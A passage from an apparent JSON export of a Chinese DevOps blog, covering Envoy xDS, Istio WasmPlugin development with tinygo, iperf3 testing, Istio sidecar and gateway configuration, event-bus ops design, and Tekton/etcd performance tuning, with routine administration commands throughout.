这个项目主要是为了方便我自己运维主机和管理集群，同时提供了周期任务能力，以及告警能力。目前还在开发中，后续会继续完善。\n在工作中去抽取项目，不是一件容易的事，需要找到项目和工作之间的契合点。很多工作中的项目和业务紧密耦合，无法抽取；而如果脱离工作，没有实际的业务场景打磨，项目也很难有价值。\n起初 opscli 有很多的子命令用于满足各种场景，但是后来我又通过 task 对象来重新实现。这样做的好处是，task 对象可以作为公司敏感数据单独存放和配置，而功能实现部分可以放开限制，不用担心敏感信息泄露。\n当然，Ansible 也实现了类似的功能，程序员的快乐之一也是不断地重复造轮子。在造轮子的过程中，我也重新学习了一遍 CRD 开发，也学习了 Helm Chart 的开发，并将其发布到了 https://artifacthub.io/。\n7. 参考 www.chenshaowen.com/ops https://github.com/shaochende/ops ","description":"","id":117,"section":"post","tags":["博文","Ops","工具","项目","开源"],"title":"文档工具化 - Ops 工具","uri":"https://www.chenshaowen.com/blog/a-open-source-ops-tool-project.html"},{"content":" Envoy 是第三个从 CNCF 毕业的项目，由于其动态生效、高性能等特性，已经成为云原生事实上的数据平面标准。很多项目都会借助于 Envoy 处理数据平面流量，而专注于控制面适配应用场景，将用户输入通过 xDS 协议写入 Envoy。\n1. Envoy 数据处理流程 其中\nDownstream，进 Envoy 的流量，客户端请求\nListener，与客户端建立链接的监听器\nNetwork Filter Chain，处理 Listener 到 Cluster 的 TCP 请求\nHTTP Router Filter，处理 Listener 到 Cluster 的 HTTP 请求\nCluster，上游的一组服务节点，用来接受请求\nUpstream，出 Envoy 的流量，请求的响应\n2. Envoy 数据平面 API xDS 是 LDS、RDS、CDS、EDS、SDS 等系列服务发现协议的统称。[1]\n其中的几个典型协议针对的阶段如下图:\nxDS 协议是一组 API，可以用于动态修改、拉取配置。\n2.1 LDS Listener Discovery Service 监听器发现服务，简写 LDS\nLDS 监听 L3/L4 层请求，可以用于限流、客户端认证、HTTP 连接管理、TCP 代理等。\n2.2 RDS Route Discovery Service，路由发现服务，简写 RDS\nRDS 提供 HTTP 路由管理能力，将匹配的流量转发到 Cluster。\n2.3 CDS Cluster Discovery Service，集群发现服务，简写 CDS\n不同于 Kubernetes Cluster，这里的 Cluster 指的是服务的对外抽象。CDS 提供对 Cluster 的增删改查的功能。\n2.4 EDS Endpoint Discovery Service，端点发现服务，简写 EDS。\n一组 Endpoint 端点构成一个 Cluster。EDS 比 DNS 能提供更智能的负载均衡策略和附加信息。\n2.5 SDS Secret Discovery Service，秘钥发现服务，简写 SDS。\n没有 SDS 时，更新证书需要重新部署；使用 SDS 时，新证书将直接被下发给全部 Envoy 实例，不需要重新部署。\n2.6 ADS Aggregated Discovery Service，聚合发现服务，简写 ADS。\n单一的发现服务无法保障变更的一致性、顺序性，比如部分先请求 EDS、部分先请求 CDS。ADS 允许 Envoy 一次性处理多种资源，解决配置的一致性、顺序性问题。\n","description":"","id":118,"section":"post","tags":["整理","Envoy","数据平面","云原生"],"title":"动态代理 Envoy","uri":"https://www.chenshaowen.com/blog/a-dynamic-proxy-envoy.html"},{"content":" wasme 只支持到 istio 1.9，而我使用的是 Istio 1.14，因此本篇直接使用 tinygo 进行验证和学习。\n1. 安装 tinygo 要求 Go v1.18+\n安装 tinygo 1 2 brew tap tinygo-org/tools brew install tinygo 查看版本 1 2 3 tinygo version tinygo version 0.27.0 darwin/amd64 (using go version go1.19.3 and LLVM version 15.0.0) 2. 创建 wasm-istio 项目 初始化项目 1 2 3 mkdir wasm-istio cd wasm-istio go mod init wasm-istio 编辑 main.go 见 https://github.com/shaowenchen/demo/blob/master/wasm-istio/main.go 主要是下面这段\n1 2 3 4 5 6 7 8 9 func (ctx *httpHeaders) OnHttpResponseHeaders(_ int, _ bool) types.Action { proxywasm.LogInfof(\u0026#34;adding header: %s=%s\u0026#34;, ctx.headerName, ctx.headerValue) // Add a hardcoded header if err := proxywasm.AddHttpResponseHeader(\u0026#34;hello\u0026#34;, \u0026#34;world\u0026#34;); err != nil { proxywasm.LogCriticalf(\u0026#34;failed to set response constant header: %v\u0026#34;, err) } ... } 编译生成 wasm 1 tinygo build -o plugin.wasm -scheduler=none -target=wasi -no-debug 3. 打包发布到镜像仓库 Dockerfile 1 2 FROM scratch COPY plugin.wasm ./ 编译生成镜像 1 docker build -t shaowenchen/wasm-istio:v1 . 推送镜像 1 docker push shaowenchen/wasm-istio:v1 4. 发布到 Istio WasmPlugin 部署一个 blog 应用 1 2 3 kubectl label namespace default istio-injection=enabled --overwrite kubectl create deploy blog --image=nginx kubectl expose deploy blog --port 80 网关配置见 https://github.com/shaowenchen/demo/blob/master/wasm-istio/blog.yaml\nblog 应用具有以下标签\n1 2 3 4 kubectl get pod --show-labels NAME READY STATUS RESTARTS AGE LABELS blog-64db778565-swdxg 2/2 Running 0 62s app=blog,pod-template-hash=64db778565,security.istio.io/tlsMode=istio,service.istio.io/canonical-name=blog,service.istio.io/canonical-revision=latest 创建以下 WasmPlugin 对象 1 2 3 4 5 6 7 8 9 10 11 apiVersion: extensions.istio.io/v1alpha1 kind: WasmPlugin metadata: name: add-header-hello-world namespace: default spec: selector: matchLabels: app: blog url: oci://docker.io/shaowenchen/wasm-istio:v1 phase: UNSPECIFIED_PHASE matchLabels 指定插件应用的 Pod 范围，需要注意 WasmPlugin 是命名空间级别的对象。phase 指定插件应用的阶段。其他参数可以参考 https://istio.io/latest/docs/reference/config/proxy_extensions/wasm-plugin/ 。\n查看 WasmPlugin 列表 1 2 3 4 kubectl get wasmplugins.extensions.istio.io NAME AGE add-header-hello-world 27s 查看 Istiod 日志 1 2 3 4 5 6 2023-02-22T08:31:10.017446Z\tinfo\tads\tPush debounce stable[75] 1 for config WasmPlugin/default/add-header-hello-world: 100.09877ms since last change, 100.098558ms since last push, full=true 2023-02-22T08:31:10.017744Z\tinfo\tads\tXDS: Pushing:2023-02-22T08:31:10Z/49 Services:10 ConnectedEndpoints:3 Version:2023-02-22T08:31:10Z/49 2023-02-22T08:31:10.017990Z\tinfo\tads\tLDS: PUSH for node:istio-egressgateway-7fcb98978c-ppkdx.istio-system resources:0 size:0B 2023-02-22T08:31:10.018241Z\tinfo\tads\tLDS: PUSH for node:istio-ingressgateway-55b6cffcbc-w6lwv.istio-system resources:1 size:3.7kB 2023-02-22T08:31:10.020476Z\tinfo\tads\tLDS: PUSH for node:blog-7cc68f9d6b-m9rpd.default resources:20 size:96.8kB 2023-02-22T08:31:10.066004Z\tinfo\tads\tECDS: PUSH request for node:blog-7cc68f9d6b-m9rpd.default resources:1 size:327B 如果有报错，可能是访问镜像仓库权限问题。虽然 WasmPlugin 也支持 S3、文件服务地址，但支持 OCI 的镜像仓库是更好的选择。\n验证结果 在本地配置 hosts 将 VirtualService 中的域名，指向网关所在主机的 IP。在终端访问，查看响应头部:\n1 2 3 4 5 6 7 8 9 10 11 12 curl http://istio.chenshaowen.com:31990/ -I HTTP/1.1 200 OK server: istio-envoy date: Wed, 22 Feb 2023 08:36:52 GMT content-type: text/html content-length: 615 last-modified: Tue, 13 Dec 2022 15:53:53 GMT etag: \u0026#34;6398a011-267\u0026#34; accept-ranges: bytes x-envoy-upstream-service-time: 2 hello: world 此时，响应头部会比之前多出来一对 key: value，即 hello: world。\n5. 参考 https://github.com/shaowenchen/demo/ ","description":"","id":119,"section":"post","tags":["博文","tinygo","Istio","Wasm"],"title":"使用 tinygo 开发 Istio WasmPlugin","uri":"https://www.chenshaowen.com/blog/developing-istio-wasm-plugin-by-tinygo.html"},{"content":"1. 安装 Ubuntu\n1 apt-get install -y iperf3 CentOS\n1 yum install -y iperf3 2. 参数 iperf3 的原理是通过客户端给服务端发送数据包来分析网络，有两种运行模式，客户端和服务端。\niperf3 的参数分为三部分，公共参数，客户端参数，服务端参数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 iperf3 -help Server or Client: -p, --port # server port to listen on/connect to -f, --format [kmgKMG] format to report: Kbits, Mbits, KBytes, MBytes -i, --interval # seconds between periodic bandwidth reports -F, --file name xmit/recv the specified file -A, --affinity n/n,m set CPU affinity -B, --bind \u0026lt;host\u0026gt; bind to a specific interface -V, --verbose more detailed output -J, --json output in JSON format --logfile f send output to a log file --forceflush force flushing output at every interval -d, --debug emit debugging output -v, --version show version information and quit -h, --help show this message and quit Server specific: -s, --server run in server mode -D, --daemon run the server as a daemon -I, --pidfile file write PID file -1, --one-off handle one client connection then exit Client specific: -c, --client \u0026lt;host\u0026gt; run in client mode, connecting to \u0026lt;host\u0026gt; -u, --udp use UDP rather than TCP -b, --bandwidth #[KMG][/#] target bandwidth in bits/sec (0 for unlimited) (default 1 Mbit/sec for UDP, unlimited for TCP) (optional slash and packet count for burst mode) --fq-rate #[KMG] enable fair-queuing based socket pacing in bits/sec (Linux only) -t, --time # time in seconds to transmit for (default 10 secs) -n, --bytes #[KMG] number of bytes to transmit (instead of -t) -k, --blockcount #[KMG] number of blocks (packets) to transmit (instead of -t or -n) -l, --len #[KMG] length of buffer to read or write (default 128 KB for TCP, dynamic or 1 for UDP) --cport \u0026lt;port\u0026gt; bind to a specific client port (TCP and UDP, default: ephemeral port) -P, --parallel # number of parallel client streams to run -R, --reverse run in reverse mode (server sends, client receives) -w, --window #[KMG] set window size / socket buffer size -C, --congestion \u0026lt;algo\u0026gt; set TCP congestion control algorithm (Linux and FreeBSD only) -M, --set-mss # set TCP/SCTP maximum segment size (MTU - 40 bytes) -N, --no-delay set TCP/SCTP no delay, disabling Nagle\u0026#39;s Algorithm -4, --version4 only use IPv4 -6, --version6 only use IPv6 -S, --tos N set the IP \u0026#39;type of service\u0026#39; -L, --flowlabel N set the IPv6 flow label (only supported on Linux) -Z, --zerocopy use a \u0026#39;zero copy\u0026#39; method of sending data -O, --omit N omit the first n seconds -T, --title str prefix every output line with this string --get-server-output get results from server --udp-counters-64bit use 64-bit counters in UDP test packets 3. 测试 服务端 1 iperf3 -s -i 1 -p 30000 客户端 测试 TCP\n1 2 3 4 5 6 7 8 9 10 11 12 iperf3 -c 1.2.3.4 -p 30000 -i 1 Connecting to host 1.2.3.4, port 30000 [ 4] local 2.3.4.5 port 44794 connected to 1.2.3.4 port 30000 [ ID] Interval Transfer Bandwidth Retr Cwnd [ 4] 0.00-1.00 sec 911 MBytes 7.64 Gbits/sec 98 1.21 MBytes ... [ 4] 9.00-10.00 sec 910 MBytes 7.63 Gbits/sec 13 1.16 MBytes - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Retr [ 4] 0.00-10.00 sec 9.18 GBytes 7.88 Gbits/sec 231 sender [ 4] 0.00-10.00 sec 9.17 GBytes 7.88 Gbits/sec receiver 测试 UDP，包大小 1460 bit\n1 2 3 4 5 6 7 8 9 10 11 12 iperf3 -c 1.2.3.4 -p 30000 -i 1 -u -l 1460 Connecting to host 1.2.3.4, port 30000 [ 4] local 2.3.4.5 port 57562 connected to 1.2.3.4 port 30000 [ ID] Interval Transfer Bandwidth Total Datagrams [ 4] 0.00-1.00 sec 116 KBytes 946 Kbits/sec 1183 ... [ 4] 9.00-10.00 sec 128 KBytes 1.05 Mbits/sec 1310 - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Jitter Lost/Total Datagrams [ 4] 0.00-10.00 sec 1.24 MBytes 1.04 Mbits/sec 0.012 ms 33/12979 (0.25%) [ 4] Sent 12979 datagrams ","description":"","id":120,"section":"post","tags":["博文","投资"],"title":"网络性能测试工具 iperf","uri":"https://www.chenshaowen.com/blog/network-performance-testing-tool-iperf.html"},{"content":" Istio 注入 Sidecar 的模板在 istio-sidecar-injector ConfigMap 中。通过 annotations 可以对 Sidecar 的各种参数进行自定义配置，比如 CPU 使用、proxyImage 等。下面主要整理的是 Sidecar 的注入方式。\n1. 给命名空间添加标签 -\u0026gt; 整个命名空间生效 注入标签 1 kubectl label namespace default istio-injection=enabled --overwrite 重启应用之后，会自动注入 Sidecar 容器。此时，访问流量将通过 envoy 转发至服务，查看响应头可验证。\n清理标签 1 kubectl label namespace default istio-injection- 2. 给 Pod 添加标签 -\u0026gt; 单个负载生效 注入标签 1 kubectl patch deployments blog -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;template\u0026#34;:{\u0026#34;metadata\u0026#34;:{\u0026#34;labels\u0026#34;:{\u0026#34;sidecar.istio.io/inject\u0026#34;:\u0026#34;true\u0026#34;}}}}}\u0026#39; --type merge Pod 会自动重启。\n清理标签 1 kubectl patch deployments blog -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;template\u0026#34;:{\u0026#34;metadata\u0026#34;:{\u0026#34;labels\u0026#34;:{\u0026#34;sidecar.istio.io/inject\u0026#34;:\u0026#34;\u0026#34;}}}}}\u0026#39; --type merge sidecar.istio.io/inject 为 false 含义是拒绝注入，因此这里需要设置为空。\n3. istioctl kube-inject 注入 -\u0026gt; 指定的负载生效 dry-run 仅查看 1 istioctl kube-inject -f deployment.yaml -o deployment-injected.yaml 或者\n1 kubectl get deployment blog -o yaml | istioctl kube-inject -f - 新建负载注入 1 istioctl kube-inject -f deployment.yaml | kubectl apply -f - 已存在的负载注入 1 kubectl get deployment blog -o yaml | istioctl kube-inject -f - | kubectl apply -f - ","description":"","id":121,"section":"post","tags":["博文","Istio","整理","事件"],"title":"Istio 注入 Sidecar 的几种方式","uri":"https://www.chenshaowen.com/blog/several-ways-to%20inject%20Sidecar.html"},{"content":"1. 常用对象配置 1.1 Gateway selector 选择规则生效的 Envoy servers 匹配的域名 端口 协议 TLS 证书 1.2 VirtualService gateways 指定生效的网关，默认值 mesh 为东西向流量；如果指定 Gateway 对象则为南北向流量 http 七层路由 重定向 重写 重试 条件规则 超时 故障注入 跨站策略 tcp 七层路由 tls 带证书路由 TLS 证书 1.3 DestinationRule host 路由 trafficPolicy 镜像流量 故障转移 熔断器 负载均衡 subsets 提供 Pod 分组，可用于蓝绿发布 2. 七层 Gateway-\u0026gt;HTTPRoute-\u0026gt;Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: default-gateway namespace: default spec: selector: istio: ingressgateway servers: - hosts: - \u0026#39;*\u0026#39; port: name: http number: 80 protocol: HTTP --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: chenshaowen namespace: default spec: gateways: - default/default-gateway hosts: - \u0026#39;istio.chenshaowen.com\u0026#39; http: - match: - uri: exact: / route: - destination: host: blog.default.svc.cluster.local port: number: 80 这样就将 default 空间下的 blog 服务通过 Istio Gateway 暴露到了外部。\n通过主机端口 + Istio Gateway 映射到主机的 NodePort 即可访问服务。如下图:\n3. 四层 Gateway-\u0026gt;TCPRoute-\u0026gt;Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: default-gateway namespace: default spec: selector: istio: ingressgateway servers: - hosts: - \u0026#39;*\u0026#39; port: name: tcp number: 80 protocol: TCP --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: chenshaowen namespace: default spec: gateways: - default/default-gateway hosts: - \u0026#39;istio.chenshaowen.com\u0026#39; tcp: - match: - port: 80 route: - destination: host: blog.default.svc.cluster.local port: number: 80 当 VirtualService 中使用 TCP 时，Gateway 也需要使用 TCP ，协议需要匹配。\n","description":"","id":122,"section":"post","tags":["博文","Istio","Gateway","流量"],"title":"Istio Gateway 下的几种流量配置路径","uri":"https://www.chenshaowen.com/blog/several-traffic-paths-under-istio-gateway.html"},{"content":"1. 积重难返的运维服务体系 针对明确的运维诉求，开发相应的运维服务以供运维、业务用户使用，本无可厚非。但如果仅满足于此，很容易出现下面的情况:\n用户频繁地寻找各个系统的入口，在各个系统之间来回跳转，忙于寻找各种按钮、拷贝参数。\n一旦这样的运维服务多起来，形成一个运维服务体系之后，更是积重难返。想变更，耦合太深，成本很高；想重构，缺少动力，风险很大。\n能不能用？可以用！\n好不好用？不太好用！\n这样一个运维体系，是很难自救的，几乎不可能依靠内部的迭代完成升级。我指的升级，是指达到一个更先进的运维平台水平。\n怎样的运维平台更先进？可以从以下几个方面考虑:\n能不能让业务团队比同类公司生产效率更高 能不能复用更多以往的领域经验 能不能避免重复开发、人力浪费 能不能更多自动化替代人工 运维围绕的是安全、稳定、高效、成本。成本不受运维平台控制，安全、稳定是运维平台的及格线，真正能使得上力气的其实只有效率。\n运维平台的最终目标是支撑业务，获得更大的比较优势。好的方面是公司竞争的赛点是不断切换的，去年是 VR，今年是 OpenAI，这样就会对平台不断地提出新要求。需要思考的是，运维平台能不能快速地满足当前业务的运维诉求？\n竞争对手需要 3 个月上线，如果你只需要 2.9 个月，那么公司就多了 0.1 个月的先发优势，逐步积累就能走得更远。\n相关平台建设的论述在之前的博文中已经有很多，在此不再过多讨论。\n回到刚才提到的积重难返的运维服务体系，这种情况下，只能借助外力破局。引入一个外部的运维体系产品，从外部招一批带着先进生成技术和理念的人，还需要负责人极大的魄力，才有可能实现平台飞跃。\n2. 使用事件总线破除 SaaS 的信息壁垒 用户在不同的运维体系之间切换、操作时，到底在做什么？\n是事件的触发，事件的流转，只不过，这些都是人工完成的。\n是人在支撑着，完成了各个 SaaS 之间的信息流转。这样的运维体系下，用户使用很累，不得不来回切换，学习各种领域知识；平台开发更累，服务之间集成很难，安全风险大，还得教会用户使用、传输各种领域知识。\n但只有引入外部系统，引发内部系统崩溃，重建运维体系一条路吗？\n当然不是只有一条路线。如果是早期，体量不大时其实可以考虑基于某个成熟的运维平台体系进行开发。一旦业务体量达到一定程度，必然不会接受外部产品全盘接收核心运维体系。\n这里提出的另外一条路线就是事件总线。\n用户需要一个新的工作台 SaaS，用于产生各个子系统需要的事件并下发到事件总线，再推送到各个子 SaaS 系统。每个运维系统都应该对接事件总线，既消费事件，也产生事件。\n为此，除了实现事件总线，基本的路由、过滤等功能，还需要能快速接入旧的 SaaS 。如下图:\n为了快速接入，需要实现两个核心的对接，一个是各系统需要的 API Middleware，以便于产生事件；另一个是，API Action，以便 SaaS 能根据事件通过 API 执行动作。\n最终，在统一的事件协议（例如 CloudEvents）整合下，实现系统之间的松耦合，再也不用考虑依赖的 SaaS 接口发生变更导致的各种集成问题了。\n3. 事件总线更适合人的工作方式 技术是为人服务的，人不应为技术所累。如果累，那么你就应该反思，是不是合理的，能不能改进，有没有机会。\n事件总线实现了关注点分离，是适合人的工作方式。\n每个系统只需要关注事件总线的消息，而不用关注其他系统的可用性，可靠性。每个系统的研发人员，也只需要专注于自己维护的系统。\n实时性高的场景，可以让事件总线主动 push 消息；其他场景，各个系统可以 pull 订阅的事件消息，各自完成任务，然后将结果事件写回到事件总线。\n更为重要的是，事件总线为运维演进提供了合适的方向。\n基于事件总线的运维体系，既能够满足业务早期人工的诉求，也能够满足后期自动化需求。\n业务早期体量小，为了能够快速上线，会有大量人工运维操作。通过事件总线，可以很好的将任务进行分类，以 TodoList 的面板形式展示给人工运维。\n业务走向成熟后，必然走向运维的自动化。此时只需要通过脚本、命令行工具、SaaS 等任意自动化形式快速消费事件，即可高效地运维。\n","description":"","id":123,"section":"post","tags":["博文","运维体系","PaaS","平台","事件"],"title":"使用事件总线改造运维体系","uri":"https://www.chenshaowen.com/blog/transform-ops-system-using-event-bus.html"},{"content":"1. 现象 - Tekton 克隆代码任务慢 在执行克隆任务时，Tekton 很费时间，多仓库下一般都需要 2 分 30 秒左右。如下图:\n仅克隆的流水线就需要执行 2 分钟 16 秒，而克隆脚本实际上仅执行 1-3 秒。其中大部分时间花在了哪里？能不能减少？这是本篇主要想讨论的问题。\n2. 分析克隆任务的时间开销 Tekton 运行流水线时，每个 Task 都会在一个独立 Pod 中运行。在上述场景下，一个 git clone task 只克隆一个仓库，如果有 N 个代码仓库，那么就需要创建至少 N 个 Pod。\n这样就出现两个优化点:\n并行执行任务 缩短单个执行时间 并行克隆可以从运维侧优化，先看看单个 Pod 执行的时间序列。\n下面这个例子总时长 34s，第一个容器启动花了 29s，约占 85%，克隆代码只有 1s\n1 2 3 4 5 6 7 8 9 10 pod -\u0026gt; 14:36:52 distroless-base -\u0026gt; 14:37:21 distroless-base \u0026lt;- 14:37:21 pipeline-entrypoint -\u0026gt; 14:37:21 pipeline-entrypoint \u0026lt;- 14:37:21 pipeline-git-init -\u0026gt; 14:37:22 clone -\u0026gt; 14:37:25 clone \u0026lt;-\u0026gt; 14:37:26 pipeline-git-init \u0026lt;- 14:37:26 pod \u0026lt;- 14:37:26 下面这个例子总时长 107s，第一个容器启动花了 24s，约占 22%，git-init 容器启动到执行脚本花了 78秒，约占 72%，克隆代码只有 2s\n1 2 3 4 5 6 7 8 9 10 pod -\u0026gt; 10:42:07 distroless-base -\u0026gt; 10:42:31 distroless-base \u0026lt;- 10:42:31 pipeline-entrypoint -\u0026gt; 10:42:32 pipeline-entrypoint \u0026lt;- 10:42:32 pipeline-git-init -\u0026gt; 10:42:34 clone -\u0026gt; 10:43:52 clone \u0026lt;-\u0026gt; 10:43:54 pipeline-git-init \u0026lt;- 10:43:54 pod \u0026lt;- 10:43:54 从上面的例子可以看到两点:\n从 Pod 创建到第一个容器运行很慢，大约需要 20-30 秒 git-init 启动之后，到开始运行克隆脚本时间不稳定 因此考虑，能不能通过加速容器启动来减少执行时间？\n3. 使用 tuned 将主机 CPU 设置为高性能模式，加快容器启动 CICD 构建使用的是物理机，在交付使用时不一定对其 CPU 工作模式进行了合理设置。CPU 的工作模式会对 CPU 工作频率产生影响，有可能导致 Pod 的启动速度慢[1]。\n查看 CPU 工作频率 1 2 3 grep -i mhz /proc/cpuinfo cpu MHz\t: 1641.500 查看 CPU 工作模式 1 2 3 cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor powersave 切换为 aliyun Ubuntu 源 1 2 3 4 cp /etc/apt/sources.list /etc/apt/sources.list.bak sed -i \u0026#34;s/cn.archive.ubuntu.com/mirrors.aliyun.com/g\u0026#34; /etc/apt/sources.list sed -i \u0026#39;/^#/d\u0026#39; /etc/apt/sources.list apt-get update 安装 tuned 1 apt install -y tuned tuned-utils tuned-utils-systemtap 启动并查看状态 1 2 3 systemctl start tuned systemctl enable tuned systemctl status tuned 获取当前模式 1 tuned-adm active 设置为性能模式 1 tuned-adm profile throughput-performance 可选项有:\nlatency-performance 延迟性能优化 network-latency 网络延迟优化 network-throughput 网络吞吐量优化 throughput-performance 吞吐性能优化 virtual-guest 虚拟机优化 virtual-host 虚拟机宿主机优化 throughput-performance 下 CPU 会以最高频率运行，Pod 启动第一个容器需要 23 秒，比之前的 46 秒提升不少。\n全部机器设置为性能模式之后，大量测试时发现代码克隆的总时长并不会显著降低。原因是，构建机配置为 40C/125GB，已经具有足够 CPU；虽然主机 CPU 处于省电模式，但是其大部分工作频率接近最高频率，并没有处于很低的状态。出现上面 46 秒 减少到 23 秒的优化，可能只是偶现效果，CPU 全部以最高频率工作时应该能抑制这种波动。\nCPU 的性能模式有利于构建加速，提供平稳的响应时间。在构建环境下，强烈建议开启 CPU 性能模式。\n4. Tekton 使用 ReadWriteMany 存储提高并行度 默认情况下 Tekton 会使用 ReadWriteOnce 存储，因为其更加通用。使用 ReadWriteMany 的前提是集群的存储系统支持这种模式。下面以 Longhorn 为例对 ReadWriteMany 进行测试:\n安装 NFS Client Longhorn 的 ReadWriteMany 卷依赖于 NFS Client。\n1 apt-get -y install nfs-common 在提交 PipelineRun 时，设置存储为 ReadWriteMany 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \u0026#34;kind\u0026#34;: \u0026#34;PipelineRun\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;tekton.dev/v1beta1\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34; }, \u0026#34;spec\u0026#34;: { \u0026#34;pipelineRef\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34; }, \u0026#34;workspaces\u0026#34;: [{ \u0026#34;volumeClaimTemplate\u0026#34;: { \u0026#34;spec\u0026#34;: { \u0026#34;accessModes\u0026#34;: [\u0026#34;ReadWriteMany\u0026#34;] } } }] } } 经过测试，发现 ReadWriteMany 与 ReadWriteOnce 模式耗时没有明显差别。\n原因是: 如果多个 Pod 在同一个节点上，ReadWriteOnce 模式下也允许同时访问。ReadWriteOnce、ReadOnlyMany、ReadWriteMany 指的是 Node 与 PV 的对应关系，而不是 Pod 与 PV 的对应关系 ，这可能是被很多人忽略的一点。在 Kubernetes 1.22+ 版本，新增的 ReadWriteOncePod 针对的才是 Pod 与 PV 的对应关系[2]\n回到 Tekton 构建的场景，由于开启了 affinity-assistant 导致一条流水线都在一个节点执行，ReadWriteOnce 与 ReadWriteMany 模式此时差别不大。\n5. 关闭 affinity-assistant 分散任务到多节点 affinity-assistant 使得单条流水线创建的 Pod 都在一个节点上。为了让 Pod 启动更快，这里尝试将克隆多个仓库的任务分散到多个节点上，以减少 IO 和创建 Pod 的压力。\n5.1 关闭 Tekton 的 affinity-assistant 编辑 Tekton 的配置文件[3]:\n1 kubectl edit configmap feature-flags -n tekton-pipelines 将 disable-affinity-assistant 设置为 true。\n这里发现另一个很有用的参数 pruner，能够自动清理 taskrun、pipelinerun。这给构建集群的运维提供了极大便利。\n此时，同一条流水线创建的 Pod 不再强行绑定在一个节点上运行，而是可以分散到其他节点。这样做的优劣如下：\n优势\n充分利用多节点，创建 Pod 并执行任务 在 Pod 调度方面有更多调优、定制的空间 劣势\n对存储系统有要求，不能用 hostpath 方式 增加节点之间的网络传输 可能导致 task 之间产物传递故障，比如上一步产生的镜像，下一步调度到其他节点之后主机上找不到 5.2 测试验证 disable-affinity-assistant + ReadWriteOnce ，执行时间明显增长 下面是截取的部分执行时长数据:\n原因在于，克隆的 Pod 被分散到多个 Node 之后，Node 之间出现了对存储使用上的竞争。也就是 Node2 上的任务需要等待 Node1 上的任务执行完成之后，才能执行。\ndisable-affinity-assistant + ReadWriteMany ，执行时长无明显变化 下面是截取的部分执行时长数据:\nReadWriteMany 模式下不同 Node 上的 Pod 能同时使用存储，但是额外增加了网络开销。一加一减，整体执行时长没有太大波动。从 Pod Status 和 Log 中获取的数据，也验证了上述观点。以下为执行的时间线:\n1 2 3 4 5 6 7 8 9 10 pod -\u0026gt; 00:12:04 distroless-base -\u0026gt; 00:12:22 distroless-base \u0026lt;- 00:12:22 pipeline-entrypoint -\u0026gt; 00:12:24 pipeline-entrypoint \u0026lt;- 00:12:24 pipeline-git-init -\u0026gt; 00:12:25 clone -\u0026gt; 00:12:33 clone \u0026lt;-\u0026gt; 00:12:48 pipeline-git-init \u0026lt;- 00:12:48 pod \u0026lt;- 00:12:48 创建容器只花了 18 秒，但是克隆脚本的执行时长平均都超过 10 秒，出现明显增长。\n存储这部分，还有一个优化是使用 Longhorn 的 strict-local 模式。编辑 Longhorn 的配置文件:\n1 kubectl -n longhorn-system edit cm longhorn-storageclass 将 numberOfReplicas 设置为 1，将 dataLocality 设置为 strict-local。 strict-local 是 Longhorn 1.4 提供的新特性，直接使用本地 Unix Socket 代理 IO 操作，而不是网络 TCP。但在构建场景下，经过测试此处不是瓶颈。\n6. 优化 Etcd 以加快集群响应 在查看系统各组件时，Etcd 的日志引起了我的注意。\n6.1 将 Etcd 迁移到更快的磁盘，降低延时 etcd 大量 warning 日志 1 2 3 4 5 6 7 journalctl -u etcd.service -f 08:42:37 node1 etcd[1091]: read-only range request \u0026#34;key:\\\u0026#34;/registry/minions/node1\\\u0026#34; \u0026#34; with result \u0026#34;range_response_count:1 size:14068\u0026#34; took too long (107.736306ms) to execute 08:42:37 node1 etcd[1091]: read-only range request \u0026#34;key:\\\u0026#34;/registry/pods/xxx/p-cfhlvsaf16letp8btsp0-fetch--rw-7qrpm\\\u0026#34; \u0026#34; with result \u0026#34;range_response_count:1 size:20887\u0026#34; took too long (103.499181ms) to execute 08:42:37 node1 etcd[1091]: read-only range request \u0026#34;key:\\\u0026#34;/registry/pods/xxx/p-cfhlvi2f16letp8btsmg-docker-build-rbrzl-pod-fjk2l\\\u0026#34; \u0026#34; with result \u0026#34;range_response_count:1 size:22666\u0026#34; took too long (115.939841ms) to execute 08:42:37 node1 etcd[1091]: read-only range request \u0026#34;key:\\\u0026#34;/registry/tekton.dev/pipelines/xxx/p-cbqcugeb23tefrmhs5jg\\\u0026#34; \u0026#34; with result \u0026#34;range_response_count:1 size:12536\u0026#34; took too long (157.681896ms) to execute 08:42:37 node1 etcd[1091]: read-only range request \u0026#34;key:\\\u0026#34;/registry/pods/xxx/p-cfhlvsaf16letp8btsp0-fetch--rw-7qrpm\\\u0026#34; \u0026#34; with result \u0026#34;range_response_count:1 size:20853\u0026#34; took too long (147.333596ms) to execute 通过监控可以看到 Etcd 磁盘延时很高，接近 200ms 关闭 Etcd 服务 1 systemctl stop etcd 更新 Etcd 数据目录 1 2 3 vim /etc/etcd.env ETCD_DATA_DIR=/data/etcd /data 目录挂载的是一块 SSD，而 /var/lib/ 是系统盘 HDD。\n迁移数据 1 mv /var/lib/etcd /data 启动 Etcd 1 systemctl start etcd 使用 SSD 之后 Etcd 磁盘延时有所降低，接近 100ms 但远没有达到目标值 25ms 以下 另外一个可能的原因在于 kube-status-metrics 开启了 labels 和 annotations 采集，导致 kube-apiserver 的压力上升。因此将关掉 kube-state-metrics，再观察 Etcd 指标，但并没有看到有明显优化效果。\n6.2 提高 Etcd 进程的 IO 优先级 持续集成极其消耗 CPU、Mem、IO、Network 资源，而 